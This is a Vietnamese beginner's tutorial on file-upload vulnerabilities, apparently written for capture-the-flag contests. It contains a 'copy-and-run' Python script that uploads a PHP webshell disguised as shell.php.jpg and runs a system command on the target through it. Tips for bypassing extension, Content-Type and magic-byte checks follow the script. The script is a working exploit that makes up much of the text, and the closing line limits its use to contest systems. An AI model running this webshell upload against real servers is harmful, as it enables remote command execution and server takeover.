# File Upload (lỗ hổng ở chức năng tải file lên)

Nhiều trang web cho phép tải file lên (ảnh đại diện, CV, tài liệu...) nhưng chỉ kiểm tra qua loa — ví dụ chỉ nhìn tên file có đuôi `.jpg` là cho qua, không kiểm tra nội dung thật bên trong. Nếu bạn đặt tên file là `shell.php.jpg` hoặc đổi đuôi giả, mà nội dung thật bên trong là 1 đoạn code PHP, và server lưu file này vào 1 thư mục mà web server vẫn chạy được code PHP — thì khi bạn mở lại đúng đường dẫn file đó, server sẽ **chạy** đoạn code PHP đó như 1 trang web thật, không phải hiển thị nó như 1 tấm ảnh. Đây gọi là tải lên 1 "webshell" (file giúp bạn chạy lệnh hệ thống qua trình duyệt).

Trên Burp bạn nhận ra lỗi này khi: form upload chấp nhận file có nội dung không khớp với đuôi khai báo (sửa tay request upload trong Repeater, đổi Content-Type hoặc nội dung file), server trả về đường dẫn file đã lưu, và khi bạn truy cập đường dẫn đó, server thực thi code trong file thay vì chỉ trả về nguyên nội dung file.

## Snippet copy-là-chạy

```python
import re
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # Nội dung thật của file: 1 đoạn code PHP đơn giản, nhận tham số "cmd" qua URL rồi chạy lệnh hệ thống
    # system(...) trong PHP = chạy 1 lệnh shell, giống hàm os.system trong Python
    content = b"<?php system($_GET['cmd']); ?>"

    # files = thông tin file upload, giống hệt phần "Choose file" trên form Burp thấy trong multipart body
    # tuple 3 phần: (tên file hiển thị, nội dung file, Content-Type khai báo)
    # đặt tên "shell.php.jpg" để thử lách qua kiểm tra đuôi file (chỉ nhìn đuôi .jpg)
    files = {"file": ("shell.php.jpg", content, "image/jpeg")}
    data = {"submit": "1"}  # các field khác của form, nếu có -- sửa theo đúng request Burp đã bắt

    r1 = session.post(f"{base_url}/upload", files=files, data=data, timeout=10)
    print("upload ->", r1.status_code, r1.text[:300])

    # Server có thể đổi tên file khi lưu -- tìm đường dẫn thật trong response (HTML/JSON trả về)
    m = re.search(r"(/uploads/[^\s\"'<>]+)", r1.text)
    path = m.group(1) if m else "/uploads/shell.php.jpg"  # fallback nếu đoán đúng tên gốc

    # Truy cập lại file đã upload, kèm tham số cmd=id để kiểm tra code PHP có thực sự được chạy không
    r2 = session.get(f"{base_url}{path}", params={"cmd": "id"}, timeout=5)
    print("gọi lại file ->", r2.status_code, r2.text[:300])
    return r2.text if "uid=" in r2.text else None


if __name__ == "__main__":
    print(solve_one(s, base))
```

## Giải thích cho người mới

- `content = b"..."` là nội dung thật nằm **bên trong** file, không liên quan gì tới tên file — dấu `b` phía trước nghĩa là chuỗi byte thô (dữ liệu dạng thô, không phải chữ Unicode bình thường), dùng khi gửi nội dung file lên.
- `files={"file": (tên, nội_dung, content_type)}` là cách `requests` giả lập đúng 1 ô "Choose file" trên form HTML — `"file"` ở đây phải khớp với `name` của input file trong HTML/trong request Burp đã bắt được (xem `view-source` hoặc request gốc để biết đúng tên).
- Đặt tên file `shell.php.jpg`: 1 số server chỉ kiểm tra đuôi cuối cùng (`.jpg` -> tưởng là ảnh, cho qua), nhưng web server thực thi file theo đuôi `.php` nằm ở giữa nếu cấu hình có lỗ hổng — đây chính là chỗ "lách" kiểm tra.
- Sau khi upload, server có thể lưu file với tên khác (đổi tên để tránh trùng) — vì vậy phải đọc response (`r1.text`) để lấy đúng đường dẫn thật, không đoán mò là `/uploads/shell.php.jpg` trừ khi response không cho biết gì khác.
- `r2 = session.get(..., params={"cmd": "id"})`: đây là bước gọi lại chính file vừa upload như gọi 1 trang PHP bình thường — tham số `cmd` được code PHP trong file đọc và chạy bằng `system()`. Nếu response có `"uid=..."`, nghĩa là code đã thật sự chạy trên server, không còn là file ảnh tĩnh nữa.

## Lưu ý nhanh

- Server có thể kiểm tra nhiều lớp: đuôi file, header `Content-Type`, nội dung thật đầu file (magic bytes — vài byte đầu tiên để nhận diện định dạng file) — thiếu lớp nào thì thử lách đúng lớp đó.
- Nếu `/uploads/shell.php.jpg` trả về 403/404, kiểm tra lại đường dẫn thật server trả trong response upload — đường dẫn lưu file thường không cố định.
- Nếu PHP không chạy (response trả nguyên code PHP dạng text), có thể server đã đổi đuôi hoặc chặn thực thi trong thư mục đó — thử các đuôi lách khác (`.phtml`, `.php5`...) nếu challenge cho phép.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
